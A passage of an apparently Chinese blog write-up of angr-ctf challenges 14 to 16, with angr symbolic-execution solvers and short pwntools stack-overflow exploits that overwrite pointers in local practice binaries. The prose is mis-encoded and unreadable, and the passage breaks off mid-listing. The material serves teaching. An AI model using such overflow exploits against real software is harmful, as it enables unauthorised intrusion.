<code>lib14_angr_shared_library.so</code> å½“ä¸­</p><p><img src="https://s2.loli.net/2022/11/04/bZiq9ks4Klyf8Gz.png" alt="image.png"></p><p>é‚£ä¹ˆè¿™é¢˜ç›´æ¥æš´åŠ› explore æ±‚è§£æ˜¯å¯ä»¥çš„ï¼Œä½†æ˜¯è¿™ä¸æ˜¯æˆ‘ä»¬åšé¢˜çš„ç›®çš„ï¼šï¼‰</p><p>è¿™é¢˜å®é™…ä¸Šçš„ç›®çš„æ˜¯è®©æˆ‘ä»¬å¯¹åŠ¨æ€é“¾æ¥åº“è¿›è¡Œç¬¦å·æ‰§è¡Œæ±‚è§£ï¼Œæˆ‘ä»¬å¯ä»¥ç›´æ¥å°†åˆå§‹çŠ¶æ€è®¾ä¸º <code>validate()</code>ï¼Œå°†ç»“æŸè®¾ä¸ºå‡½æ•°è¿”å›ï¼Œå¹¶æ·»åŠ å¯¹è¿”å›å€¼çš„çº¦æŸåè¿›è¡Œæ±‚è§£å³å¯</p><p>æˆ‘ä»¬ç°åœ¨æ¥é€†ä¸€ä¸‹è¿™ä¸ªåŠ¨æ€é“¾æ¥åº“ï¼Œå…¶ä¸­å°±åªæ˜¯æ¯”è¾ƒç®€å•çš„ä¸€ä¸ª complex å¤„ç†çš„è¿‡ç¨‹è€Œå·²</p><p><img src="https://s2.loli.net/2022/11/04/oQyUL8W6hb2f9zl.png" alt="image.png"></p><p>é‚£ä¹ˆæˆ‘ä»¬åªéœ€è¦æ¨¡æ‹Ÿè°ƒç”¨ <code>validate()</code> çš„è¿‡ç¨‹å³å¯ï¼Œæˆ‘ä»¬å…ˆç”¨ <code>claripy.BVS()</code> åˆ›å»ºä¸€ä¸ªè¡¨ç¤ºè¦æ±‚è§£çš„å­—ç¬¦ä¸²çš„ç¬¦å·å‘é‡ï¼Œå°†å…¶è½½å…¥åˆ°åˆå§‹çŠ¶æ€å†…å­˜ä¸­çš„ä¸€ä¸ªåœ°å€ä¸Šï¼Œä¹‹åå°†è¿™å—å†…å­˜çš„åœ°å€æ¨åˆ°æ ˆä¸Šä½œä¸º <code>validate()</code> çš„å‚æ•°å³å¯</p><p>æœ€åå°±æ˜¯ç›´æ¥ <code>explore()</code> åˆ°å‡½æ•°è¿”å›åæ·»åŠ  <code>eax == 1</code> çš„çº¦æŸåæ±‚è§£å³å¯ï¼Œéœ€è¦æ³¨æ„çš„æ˜¯ç”±äºè¿™æ˜¯ä¸€ä¸ªåŠ¨æ€é“¾æ¥åº“ï¼Œå› æ­¤æˆ‘ä»¬éœ€è¦åœ¨åˆ›å»º project æ—¶é€šè¿‡æŒ‡å®šåŠ è½½å‚æ•° <code>load_options</code> æ¥<strong>æ‰‹åŠ¨æŒ‡å®šåŠ è½½åŸºåœ°å€</strong>ï¼Œå…·ä½“å†™æ³•å‚ç…§ç¬”è€…çš„ exp</p><p>å› æ­¤æœ€ç»ˆçš„è§£é¢˜è„šæœ¬å¦‚ä¸‹ï¼š</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> angr<br><span class="hljs-keyword">import</span> claripy<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">solver</span>():<br>    bin_path = <span class="hljs-string">&#x27;./lib14_angr_shared_library.so&#x27;</span><br>    base_addr = <span class="hljs-number">0x400000</span><br>    proj = angr.Project(bin_path, load_options = &#123;<br>        <span class="hljs-string">&#x27;main_opts&#x27;</span>: &#123;<br>            <span class="hljs-string">&#x27;custom_base_addr&#x27;</span>: base_addr<br>        &#125;<br>    &#125;)<br>    start_addr = base_addr + <span class="hljs-number">0x129C</span> <span class="hljs-comment"># addr of validate()</span><br>    init_state = proj.factory.blank_state(addr = start_addr)<br><br>    password = claripy.BVS(<span class="hljs-string">&#x27;password&#x27;</span>, <span class="hljs-number">8</span> * <span class="hljs-number">8</span>) <span class="hljs-comment"># 8 bytes</span><br>    password_addr = <span class="hljs-number">0x3000000</span><br>    init_state.memory.store(password_addr, password)<br><br>    <span class="hljs-comment"># emulate the process of calling validate(password, 8)</span><br>    init_state.regs.ebp = init_state.regs.esp<br>    init_state.stack_push(<span class="hljs-number">8</span>)<br>    init_state.stack_push(password_addr)<br>    init_state.stack_push(<span class="hljs-number">0xdeadbeef</span>)<br><br>    simgr = proj.factory.simgr(init_state)<br>    simgr.explore(find = base_addr + <span class="hljs-number">0x134B</span>)<br><br>    solution_state = simgr.found[<span class="hljs-number">0</span>]<br>    solution_state.add_constraints(solution_state.regs.eax == <span class="hljs-number">1</span>)<br>    <span class="hljs-built_in">print</span>(solution_state.solver.<span class="hljs-built_in">eval</span>(password, cast_to=<span class="hljs-built_in">bytes</span>))<br><br><span class="hljs-keyword">if</span> __name__ == <span class="hljs-string">&#x27;__main__&#x27;</span>:<br>    solver()<br></code></pre></td></tr></table></figure><p>è¿˜æ˜¯å·®ä¸å¤šç§’è§£ï¼š</p><p><img src="https://s2.loli.net/2022/11/05/vQi5PtLqbOVWrxa.png" alt="image.png"></p><p>å½“ç„¶ï¼Œç¬”è€…è¿™é‡Œè°ƒç”¨å‡½æ•°çš„æ–¹æ³•æ¯”è¾ƒç²—çŠ·ï¼Œä¹Ÿå¯ä»¥ä½¿ç”¨ angr æä¾›çš„ <code>project.factory.call_state(func_addr, args...)</code> æ¥åˆ›å»ºä¸€ä¸ªå‡½æ•°è°ƒç”¨çš„åˆå§‹çŠ¶æ€ï¼Œç”¨ä¾‹å†™æ³•å¦‚ä¸‹ï¼š</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> angr<br><br>bin_path = <span class="hljs-string">&#x27;./test&#x27;</span><br>proj = angr.Project(bin_path)<br><br>func_addr = <span class="hljs-number">0xdeadbeef</span><br>init_state = proj.factory.call_state(func_addr, <span class="hljs-number">114514</span>, <span class="hljs-number">1919810</span>) <span class="hljs-comment"># func(114514, 1919810)</span><br></code></pre></td></tr></table></figure><h1 id="0x07-angr-ctfï¼šæ¼æ´åˆ©ç”¨"><a href="#0x07-angr-ctfï¼šæ¼æ´åˆ©ç”¨" class="headerlink" title="0x07. angr-ctfï¼šæ¼æ´åˆ©ç”¨"></a>0x07. angr-ctfï¼šæ¼æ´åˆ©ç”¨</h1><h2 id="15-angr-arbitrary-readï¼šæ ˆæº¢å‡ºå˜é‡è¦†ç›–"><a href="#15-angr-arbitrary-readï¼šæ ˆæº¢å‡ºå˜é‡è¦†ç›–" class="headerlink" title="15_angr_arbitrary_readï¼šæ ˆæº¢å‡ºå˜é‡è¦†ç›–"></a>15_angr_arbitrary_readï¼šæ ˆæº¢å‡ºå˜é‡è¦†ç›–</h2><p>æƒ¯ä¾‹æ‹–å…¥ IDAï¼Œé€»è¾‘æ¯”è¾ƒç®€å•ï¼Œå¦‚æœç¬¬ä¸€ä¸ªæ•°ä¸æ˜¯ 42698355 æˆ–è€…ç¬¬ä¸€ä¸ªæ•°æ˜¯ 9507730 å°±è¾“å‡º <code>&quot;Try again.&quot;</code> ï¼Œå¦åˆ™è¾“å‡º s å­—ç¬¦ä¸²ï¼Œè€Œåœ¨è¯»å…¥åˆ° v4 æ—¶å­˜åœ¨ä¸€ä¸ªæ ˆæº¢å‡ºå¯ä»¥è¦†ç›– s æŒ‡é’ˆï¼Œå› æ­¤æˆ‘ä»¬å¯ä»¥è®©å…¶è¾“å‡ºæŒ‡å®šåœ°å€ä¸Šçš„å­—ç¬¦ä¸²</p><p><img src="https://s2.loli.net/2022/11/05/Xm2yczB6WNTa1ex.png" alt="image.png"></p><p>è€Œä¼—æ‰€å‘¨çŸ¥ angr-ctf å½“ä¸­çš„é¢˜ç›®éƒ½è¦æˆ‘ä»¬è¾“å‡º <code>&quot;Good Job.&quot;</code> å­—ç¬¦ä¸²ï¼Œæˆ‘ä»¬åœ¨ IDA ä¸­å¯ä»¥å¾ˆå®¹æ˜“æ‰¾åˆ°ä»–çš„åœ°å€ï¼Œæ‰€ä»¥æœ€åçš„ exp å¦‚ä¸‹ï¼š</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">exp</span>():<br>    p = process(<span class="hljs-string">&#x27;./15_angr_arbitrary_read&#x27;</span>)<br>    p.sendline(<span class="hljs-string">b&#x27;42698355 &#x27;</span> + <span class="hljs-string">b&#x27;A&#x27;</span> * <span class="hljs-number">0x10</span> + p32(<span class="hljs-number">0x58465157</span>))<br>    p.interactive()<br><br><span class="hljs-keyword">if</span> __name__ == <span class="hljs-string">&#x27;__main__&#x27;</span>:<br>    exp()<br></code></pre></td></tr></table></figure><p>è¿è¡Œå³å¯è·å¾— <code>&quot;Good Job.&quot;</code> </p><p><img src="https://s2.loli.net/2022/11/05/p3gPi9TYl1fuU6h.png" alt="image.png"></p><p>â€”â€”ä½†è¿™å¹¶ä¸æ˜¯æˆ‘ä»¬åšè¿™ä¸€é“é¢˜çš„ç›®çš„ï¼Œæˆ‘ä»¬åº”å½“ä½¿ç”¨ angr æ¥æ±‚è§£ï¼šï¼‰</p><p>é‚£ä¹ˆç”¨ angr è¯¥æ€ä¹ˆåšå‘¢ï¼Ÿä¸€å¼€å§‹ç¬”è€…ä¹Ÿæ²¡å¤ªæƒ³æ˜ç™½ï¼Œåé¢æƒ³åˆ°æ—¢ç„¶è¾“å…¥çš„é•¿åº¦æ˜¯å·²çŸ¥çš„ï¼Œé‚£ä¹ˆæˆ‘ä»¬å¯ä»¥ä½¿ç”¨ SimProcedure æ¥ hook æ‰ scanfï¼Œå°†è¾“å…¥ä½œä¸ºç¬¦å·ä½å‘é‡è¿›è¡Œæ±‚è§£ï¼ŒåŒæ—¶æˆ‘ä»¬åº”å½“ä¸ºç¬¬äºŒä¸ªè¾“å…¥å­—ç¬¦ä¸²ä¸­çš„æ¯ä¸ªå­—ç¬¦æ·»åŠ æˆå¯è§å­—ç¬¦çš„çº¦æŸ</p><p>é‚£ä¹ˆè¿™é‡Œæˆ‘ä»¬å¯ä»¥ä½¿ç”¨ <code>BVS.chop(bits=n)</code> æ¥å°†ç¬¦å·ä½å‘é‡æŒ‰ç…§ä¸€å®šå°ºå¯¸è¿›è¡Œåˆ†å‰²ï¼Œäºæ˜¯æœ€åçš„æ¨¡æ‹Ÿ scanf å†™æ³•å¦‚ä¸‹ï¼š</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">class</span> <span class="hljs-title class_">MySimScanfProcedure</span>(angr.SimProcedure):<br>    <span class="hljs-keyword">def</span> <span class="hljs-title function_">run</span>(<span class="hljs-params">self, <span class="hljs-built_in">str</span>, key_addr, chr_arr_addr</span>):<br>        key_bvs = claripy.BVS(<span class="hljs-string">&#x27;key&#x27;</span>, <span class="hljs-number">4</span> * <span class="hljs-number">8</span>)<br>        chr_arr_bvs = claripy.BVS(<span class="hljs-string">&#x27;chr_arr&#x27;</span>, <span class="hljs-number">20</span> * <span class="hljs-number">8</span>)<br>        <span class="hljs-keyword">for</span> ch <span class="hljs-keyword">in</span> chr_arr_bvs.chop(bits = <span class="hljs-number">8</span>):<br>            self.state.add_constraints(ch &gt;= <span class="hljs-string">&#x27;0&#x27;</span>, ch &lt;= <span class="hljs-string">&#x27;z&#x27;</span>)<br>        self.state.memory.store(key_addr, key_bvs,<br>                                endness = proj.arch.memory_endness)<br>        self.state.memory.store(chr_arr_addr, chr_arr_bvs)<br>        self.state.<span class="hljs-built_in">globals</span>[<span class="hljs-string">&#x27;password_0&#x27;</span>] = key_bvs<br>        self.state.<span class="hljs-built_in">globals</span>[<span class="hljs-string">&#x27;password_1&#x27;</span>] = chr_arr_bvs<br><br>proj.hook_symbol(<span class="hljs-string">&#x27;__isoc99_scanf&#x27;</span>, MySimScanfProcedure())<br></code></pre></td></tr></table></figure><p>æ¥ä¸‹æ¥æˆ‘ä»¬éœ€è¦åˆ¤æ–­æˆ‘ä»¬çš„ç¬¦å·åŒ–å‘é‡æ˜¯å¦è·å¾—äº†æˆ‘ä»¬é¢„æœŸä¸­çš„ç»“æœï¼Œæˆ‘ä»¬è¿™ä¸€æ¬¡å°†è·¯å¾„æ¢ç´¢çš„ç»ˆç»“ç‚¹æ”¾åœ¨ <code>puts()</code>ï¼Œå¹¶åˆ¤æ–­å…¶å‚æ•°æ˜¯å¦ä¸º <code>&quot;Good Job.&quot;</code> å­—ç¬¦ä¸²çš„åœ°å€ï¼š</p><ul><li>ä½¿ç”¨ <code>state.memory.load()</code> å°† <code>puts()</code> çš„å‚æ•°æå–å‡ºæ¥</li><li>ä½¿ç”¨ <code>state.solver.symbolic()</code> åˆ¤æ–­ <code>puts()</code> çš„å‚æ•°æ˜¯å¦æ˜¯æˆ‘ä»¬çš„ BVS</li><li>ä½¿ç”¨ <code>state.copy()</code> è·å–å½“å‰çŠ¶æ€çš„å‰¯æœ¬ï¼Œä¹‹ååœ¨è¯¥å‰¯æœ¬ä¸Šæ·»åŠ çº¦æŸä»¥é¿å…å½±å“åˆ°åŸçŠ¶æ€</li><li>ä½¿ç”¨ <code>state.satisfiable()</code> åˆ¤æ–­æ˜¯å¦æ»¡è¶³çº¦æŸï¼Œè‹¥æ˜¯åˆ™æ·»åŠ åˆ°åŸçŠ¶æ€ä¸­æ±‚è§£å³å¯</li></ul><p>æ–¹ä¾¿èµ·è§ï¼Œè¿™é‡Œç¬”è€…å°†æœç´¢çš„åœ°å€è®¾ä¸º <code>puts()</code> å‡½æ•°çš„ plt è¡¨åœ°å€ï¼š</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">def</span> <span class="hljs-title function_">is_success</span>(<span class="hljs-params">state</span>):<br>    call_puts_addr = <span class="hljs-number">0x8049090</span><br>    <span class="hljs-keyword">if</span> state.addr != call_puts_addr:<br>        <span class="hljs-keyword">return</span> <span class="hljs-literal">False</span><br><br>    good_str_addr = <span class="hljs-number">0x58465157</span><br>    puts_param = state.memory.load(state.regs.esp + <span class="hljs-number">4</span>, <span class="hljs-number">4</span>,<br>                                   endness = proj.arch.memory_endness)<br>    <span class="hljs-keyword">if</span> state.solver.symbolic(puts_param):<br>        copy_state = state.copy()<br>        copy_state.add_constraints(puts_param == good_str_addr)<br>        <span class="hljs-keyword">if</span> copy_state.satisfiable():<br>            state.add_constraints(puts_param == good_str_addr)<br>            <span class="hljs-keyword">return</span> <span class="hljs-literal">True</span><br>        <span class="hljs-keyword">else</span>:<br>            <span class="hljs-keyword">return</span> <span class="hljs-literal">False</span><br>    <span class="hljs-keyword">else</span>:<br>        <span class="hljs-keyword">return</span> <span class="hljs-literal">False</span><br><br>simgr.explore(find = is_success)<br></code></pre></td></tr></table></figure><p>é™¤äº†é€šè¿‡å¤åˆ¶çŠ¶æ€åæ·»åŠ çº¦æŸå¹¶åˆ¤æ–­çš„æ–¹æ³•ä»¥å¤–ï¼Œæˆ‘ä»¬ä¹Ÿå¯ä»¥é€šè¿‡ä¸º <code>state.satisfiable()</code> æŒ‡å®š <code>extra_constraints</code> å‚æ•°çš„æ–¹å¼æ¥åœ¨ä¸å½±å“çŠ¶æ€æœ¬èº«å·²æœ‰çº¦æŸé›†çš„çŠ¶æ€ä¸‹è¿›è¡Œçº¦æŸåˆ¤æ–­ï¼Œå› æ­¤ä¸Šé¢çš„ is_success() å‡½æ•°ä¹Ÿå¯ä»¥å†™æˆå¦‚ä¸‹å½¢å¼ï¼š</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">def</span> <span class="hljs-title function_">is_success</span>(<span class="hljs-params">state</span>):<br>    call_puts_addr = <span class="hljs-number">0x8049090</span><br>    <span class="hljs-keyword">if</span> state.addr != call_puts_addr:<br>        <span class="hljs-keyword">return</span> <span class="hljs-literal">False</span><br><br>    good_str_addr = <span class="hljs-number">0x58465157</span><br>    puts_param = state.memory.load(state.regs.esp + <span class="hljs-number">4</span>, <span class="hljs-number">4</span>,<br>                                   endness = proj.arch.memory_endness)<br>    <span class="hljs-keyword">if</span> state.solver.symbolic(puts_param):<br>        <span class="hljs-keyword">if</span> state.satisfiable(extra_constraints=(puts_param == good_str_addr,)):<br>            state.add_constraints(puts_param == good_str_addr)<br>            <span class="hljs-keyword">return</span> <span class="hljs-literal">True</span><br>        <span class="hljs-keyword">else</span>:<br>            <span class="hljs-keyword">return</span> <span class="hljs-literal">False</span><br>    <span class="hljs-keyword">else</span>:<br>        <span class="hljs-keyword">return</span> <span class="hljs-literal">False</span><br><br>simgr.explore(find = is_success)<br></code></pre></td></tr></table></figure><p>å°†ä¸Šé¢çš„è¿›è¡Œæ•´åˆå°±æ˜¯æˆ‘ä»¬æœ€åçš„ exp äº†ï¼š</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> angr<br><span class="hljs-keyword">import</span> claripy<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">solver</span>():<br>    bin_path = <span class="hljs-string">&#x27;./15_angr_arbitrary_read&#x27;</span><br>    proj = angr.Project(bin_path)<br><br>    <span class="hljs-keyword">class</span> <span class="hljs-title class_">MySimScanfProcedure</span>(angr.SimProcedure):<br>        <span class="hljs-keyword">def</span> <span class="hljs-title function_">run</span>(<span class="hljs-params">self, <span class="hljs-built_in">str</span>, key_addr, chr_arr_addr</span>):<br>            key_bvs = claripy.BVS(<span class="hljs-string">&#x27;key&#x27;</span>, <span class="hljs-number">4</span> * <span class="hljs-number">8</span>)<br>            chr_arr_bvs = claripy.BVS(<span class="hljs-string">&#x27;chr_arr&#x27;</span>, <span class="hljs-number">20</span> * <span class="hljs-number">8</span>)<br>            <span class="hljs-keyword">for</span> ch <span class="hljs-keyword">in</span> chr_arr_bvs.chop(bits = <span class="hljs-number">8</span>):<br>                self.state.add_constraints(ch &gt;= <span class="hljs-string">&#x27;0&#x27;</span>, ch &lt;= <span class="hljs-string">&#x27;z&#x27;</span>)<br>            self.state.memory.store(key_addr, key_bvs,<br>                                    endness = proj.arch.memory_endness)<br>            self.state.memory.store(chr_arr_addr, chr_arr_bvs)<br>            self.state.<span class="hljs-built_in">globals</span>[<span class="hljs-string">&#x27;password_0&#x27;</span>] = key_bvs<br>            self.state.<span class="hljs-built_in">globals</span>[<span class="hljs-string">&#x27;password_1&#x27;</span>] = chr_arr_bvs<br><br>    proj.hook_symbol(<span class="hljs-string">&#x27;__isoc99_scanf&#x27;</span>, MySimScanfProcedure())<br><br>    init_state = proj.factory.entry_state()<br>    simgr = proj.factory.simgr(init_state)<br><br>    <span class="hljs-keyword">def</span> <span class="hljs-title function_">is_success</span>(<span class="hljs-params">state</span>):<br>        call_puts_addr = <span class="hljs-number">0x8049090</span><br>        <span class="hljs-keyword">if</span> state.addr != call_puts_addr:<br>            <span class="hljs-keyword">return</span> <span class="hljs-literal">False</span><br><br>        good_str_addr = <span class="hljs-number">0x58465157</span><br>        puts_param = state.memory.load(state.regs.esp + <span class="hljs-number">4</span>, <span class="hljs-number">4</span>,<br>                                       endness = proj.arch.memory_endness)<br>        <span class="hljs-keyword">if</span> state.solver.symbolic(puts_param):<br>            copy_state = state.copy()<br>            copy_state.add_constraints(puts_param == good_str_addr)<br>            <span class="hljs-keyword">if</span> copy_state.satisfiable():<br>                state.add_constraints(puts_param == good_str_addr)<br>                <span class="hljs-keyword">return</span> <span class="hljs-literal">True</span><br>            <span class="hljs-keyword">else</span>:<br>                <span class="hljs-keyword">return</span> <span class="hljs-literal">False</span><br>        <span class="hljs-keyword">else</span>:<br>            <span class="hljs-keyword">return</span> <span class="hljs-literal">False</span><br><br>    simgr.explore(find = is_success)<br><br>    <span class="hljs-keyword">if</span> simgr.found:<br>        solution_state = simgr.found[<span class="hljs-number">0</span>]<br>        solution_0 = solution_state.solver.<span class="hljs-built_in">eval</span>(solution_state.<span class="hljs-built_in">globals</span>[<span class="hljs-string">&#x27;password_0&#x27;</span>])<br>        solution_1 = solution_state.solver.<span class="hljs-built_in">eval</span>(solution_state.<span class="hljs-built_in">globals</span>[<span class="hljs-string">&#x27;password_1&#x27;</span>],<br>                                                cast_to=<span class="hljs-built_in">bytes</span>)<br><br>        <span class="hljs-built_in">print</span>(<span class="hljs-string">&#x27;password_0: &#123;&#125;&#x27;</span>.<span class="hljs-built_in">format</span>(solution_0))<br>        <span class="hljs-built_in">print</span>(<span class="hljs-string">&#x27;password_1: &#123;&#125;&#x27;</span>.<span class="hljs-built_in">format</span>(solution_1))<br>    <span class="hljs-keyword">else</span>:<br>        <span class="hljs-keyword">raise</span> Exception(<span class="hljs-string">&#x27;Could not find the solution!&#x27;</span>)<br><br><span class="hljs-keyword">if</span> __name__ == <span class="hljs-string">&quot;__main__&quot;</span>:<br>    solver()<br></code></pre></td></tr></table></figure><p>è¿è¡Œå³å¯æˆåŠŸè¾“å‡º <code>&quot;Good Job.&quot;</code>ï¼š</p><p><img src="https://s2.loli.net/2022/11/30/oL6Nn2hpgq5PmHz.png" alt="image.png"></p><h2 id="16-angr-arbitrary-writeï¼šæ ˆæº¢å‡ºå˜é‡è¦†ç›–"><a href="#16-angr-arbitrary-writeï¼šæ ˆæº¢å‡ºå˜é‡è¦†ç›–" class="headerlink" title="16_angr_arbitrary_writeï¼šæ ˆæº¢å‡ºå˜é‡è¦†ç›–"></a>16_angr_arbitrary_writeï¼šæ ˆæº¢å‡ºå˜é‡è¦†ç›–</h2><p>è¿˜æ˜¯æƒ¯ä¾‹åœ°æ‹–å…¥ IDAï¼Œæœ¬é¢˜é€»è¾‘ä¸»è¦æ˜¯è¯»å…¥è¾“å…¥ååˆ¤æ–­ key æ˜¯å¦æ˜¯ <code>10225924</code>ï¼Œè‹¥æ˜¯åˆ™æ‹·è´å­—ç¬¦ä¸² <code>s</code> åˆ° <code>dest</code> æ‰€æŒ‡å­—ç¬¦ä¸²ï¼Œå¦åˆ™æ‹·è´åˆ° <code>unimporttant_buffer</code>ï¼Œæœ€ååˆ¤æ–­ <code>password_buffer</code> æ˜¯å¦ä¸º <code>&quot;UEQFKBEC&quot;</code>ï¼Œè‹¥æ˜¯åˆ™è¾“å‡º <code>&quot;Good Job.&quot;</code> å­—ç¬¦ä¸²ï¼š</p><p><img src="https://s2.loli.net/2022/11/30/FHCbNrcSz8YliIU.png" alt="image.png"></p><p>å’Œä¸Šä¸€é¢˜ç±»ä¼¼ï¼Œæœ¬é¢˜çš„è¾“å…¥è¯»å…¥åŒæ ·å­˜åœ¨ä¸€ä¸ªæº¢å‡ºï¼Œå¯ä»¥è®©æˆ‘ä»¬è¦†ç›–åˆ° <code>dest</code> ï¼Œæˆ‘ä»¬ä¸éš¾æƒ³åˆ°çš„æ˜¯è‹¥æ˜¯å°† <code>dest</code> è¦†ç›–ä¸º <code>password_buffer</code> çš„åœ°å€ï¼Œä¾¿èƒ½ç›´æ¥è¦†å†™å…¶ä¸­çš„å†…å®¹</p><p>äºæ˜¯æœ€åçš„ exp å¦‚ä¸‹ï¼š</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br>p = process(<span class="hljs-string">&quot;./16_angr_arbitrary_write&quot;</span>)<br>p.sendline(<span class="hljs-string">b&quot;10225924 &quot;</span> + <span class="hljs-string">b&quot;UEQFKBEC&quot;</span> + <span class="hljs-string">b&quot;arttnba3&quot;</span> + p32(<span class="hljs-number">0x58465148</span>))<br>p.interactive()<br></code></pre></td></tr></table></figure><p>è¿è¡Œå³å¯è·å¾— <code>&quot;Good Job.&quot;</code> </p><p><img src="https://s2.loli.net/2022/12/02/RjGDpmMz5go3QrN.png" alt="image.png"></p><p>â€”â€”ä½†è¿™å¹¶ä¸æ˜¯æˆ‘ä»¬åšè¿™ä¸€é“é¢˜çš„ç›®çš„ï¼Œæˆ‘ä»¬åº”å½“ä½¿ç”¨ angr æ¥æ±‚è§£ï¼šï¼‰</p><p>é‚£ä¹ˆç”¨ angr è¯¥æ€ä¹ˆåšå‘¢ï¼Ÿè¿™é¢˜å…¶å®å’Œä¸Šä¸€é“é¢˜æœ¬è´¨ä¸Šæ˜¯ä¸€æ ·çš„ï¼Œæˆ‘ä»¬åŒæ ·å¯ä»¥é€šè¿‡ hook scanf çš„æ–¹å¼æ¥å°†æˆ‘ä»¬çš„è¾“å…¥ç¬¦å·åŒ–ï¼Œä¹‹ååœ¨ <code>explore()</code> ä¸­è®¾ç½®ä¸€ä¸ªåœ¨ <code>strncpy()</code> ä¸Šè¿›è¡Œåˆ¤æ–­çš„å‡½æ•°â€”â€”åˆ¤æ–­å…¶ç¬¬ä¸€ä¸ªå‚æ•°æ˜¯å¦ä¸º <code>password_buffer</code>ã€ç¬¬äºŒä¸ªå‚æ•°æ˜¯å¦ä¸º <code>&quot;UEQFKBEC&quot;</code> å³å¯</p><p>æœ€ç»ˆçš„è§£é¢˜è„šæœ¬å¦‚ä¸‹ï¼š</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span 